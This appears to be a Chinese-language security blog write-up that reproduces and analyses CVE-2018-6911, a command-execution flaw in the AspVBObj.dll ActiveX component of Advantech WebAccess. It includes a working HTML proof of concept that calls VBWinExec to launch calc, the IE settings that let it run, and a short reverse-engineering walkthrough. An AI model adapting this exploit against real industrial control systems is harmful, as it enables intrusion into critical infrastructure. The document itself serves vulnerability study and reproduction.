---
title: 工控漏洞@CVE-2018-6911 Advantech WebAccess远程任意命令执行复现分析
date: 2021-02-06 17:25:48
tags:
cover: https://gitee.com/tutucoo/images/raw/master/uPic/Yx1Kja.jpg
---

## 漏洞概述 

Advantech Webaccess Node目录下的AspVBObj.dll文件中存在VBWinExec方法，该方法允许攻击者通过命令参数执行任意系统命令



## 环境准备

1.Windows 7 

2.Advantech WebAccess 8.2

3.IE 9



## 漏洞复现



 安装Advantech WebAccess 8.2

由于该漏洞是利用com组件，因此只要存在AspVBObj.dll文件即可完成EXP，安装完毕后，将EXP另存为html文件

```
<title>Advantech WebAccess Node8.3.0 "AspVBObj.dll" - Remote Code Execution</title>

<body> 
    <object id=rce classid="clsid:{55F52D11-CEA5-4D6C-9912-2C8FA03275CE}"></object>
    <SCRIPT>  
        function exploit() { 
            rce.VBWinExec("calc") 
        }  
    </SCRIPT> 
    <input language=JavaScript onclick=exploit() type=button value="Exploit-Me">
</body>

</HTML>	
```

打开IE选项-安全-自定义级别

![img](https://gitee.com/tutucoo/images/raw/master/uPic/00831rSTgy1gckdl3erp1j30d607wt9i.jpg)

 

设置“对未标记为可安全执行脚本的ActiveX控件初始化并执行”为启用

![img](https://gitee.com/tutucoo/images/raw/master/uPic/00831rSTgy1gckdl3xkx6j30es02qjrn.jpg)

 

 

 在Windows7上访问服务器的EXP网页，执行exp

![img](https://gitee.com/tutucoo/images/raw/master/uPic/00831rSTgy1gckdl05u9sj30gm06qq36.jpg)

  

命令顺利执行

![img](https://gitee.com/tutucoo/images/raw/master/uPic/00831rSTgy1gckdl4bvulj30c60dygnn.jpg)

 

 

 

## 漏洞原理

 

在html的object元素中定义clsid，可以用于Windows上的com组件的引用，clsid是该dll的统一唯一标识符，Windows中的com组件就是通过clsid来进行引用的。

根据它的clsid：{55F52D11-CEA5-4D6C-9912-2C8FA03275CE}在注册表中进行搜索

![img](https://gitee.com/tutucoo/images/raw/master/uPic/00831rSTgy1gckdl0mqggj30i007i74r.jpg)

 

可以找到它的键值，AspVBObj

![img](https://gitee.com/tutucoo/images/raw/master/uPic/00831rSTgy1gckdl120kuj30rg0h0acu.jpg)

 

 

 

可以猜测这是它的一个dll文件，在C:\WebAccess\Node目录下找到AspVBObj.dll，拖进IDA进行逆向分析，打开字符串小窗口看到一个VBWinExec函数

![img](https://gitee.com/tutucoo/images/raw/master/uPic/00831rSTgy1gckdkznvuej30ya0b2413.jpg)

 

根据经验可以判断这个很可能是个命令执行的函数，根据poc，可以看到这个命令执行的函数使用方法是直接传递字符串calc实现了弹出系统自带计算器

 

## 总结

经测试在Advantech WebAccess 8.2版本中也存在该漏洞，可以成功执行EXP，基于该漏洞的类型，影响的版本可能比较广泛。